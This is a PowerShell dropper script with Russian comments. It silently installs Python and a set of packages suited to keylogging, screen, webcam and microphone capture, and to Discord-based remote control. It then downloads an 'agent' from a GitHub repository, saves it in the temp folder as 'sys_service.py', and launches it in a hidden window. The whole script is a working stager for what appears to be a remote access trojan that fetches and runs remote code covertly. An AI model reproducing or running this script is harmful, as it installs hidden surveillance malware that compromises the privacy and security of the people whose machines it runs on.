$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = 'SilentlyContinue'

# 1. ПРОВЕРКА И УСТАНОВКА PYTHON
$pyPath = "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe"
if (-not (Test-Path $pyPath)) {
    # Скачиваем установщик
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile "$env:TEMP\py_setup.exe"

    # Тихая установка для текущего пользователя, добавление в PATH
    Start-Process -FilePath "$env:TEMP\py_setup.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_launcher=0" -Wait

    # Удаляем установщик
    Remove-Item "$env:TEMP\py_setup.exe" -Force

    # Обновляем переменные среды в текущей сессии
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")

    # Повторная проверка пути (иногда требует перезапуска терминала, но мы подстрахуемся)
    if (-not (Test-Path $pyPath)) {
        $pyPath = "python.exe" # Fallback на глобальный PATH
    }
} else {
}

# 2. УСТАНОВКА ЗАВИСИМОСТЕЙ
$deps = "discord.py keyboard mouse psutil pyttsx3 requests pywin32 pycryptodome Pillow comtypes pycaw opencv-python"

# Обновляем pip
& $pyPath -m pip install --upgrade pip -q

# Ставим основные либы
& $pyPath -m pip install $deps -q

# Специальная обработка PyAudio (часто требует wheel или C++ build tools)
# Используем pipwin для автоматического скачивания готовых wheel
& $pyPath -m pip install pipwin -q
& $pyPath -m pipwin install pyaudio -q

# 3. ЗАГРУЗКА АГЕНТА
$repoUrl = "https://github.com/ht-at/DOTAMOD/raw/refs/heads/main/DOTA.py"
$botPath = "$env:TEMP\sys_service.py"

# Скачиваем агента
Invoke-WebRequest -Uri $repoUrl -OutFile $botPath

# 4. СКРЫТЫЙ ЗАПУСК
Start-Process -FilePath $pyPath -ArgumentList "-W ignore `"$botPath`"" -WindowStyle Hidden
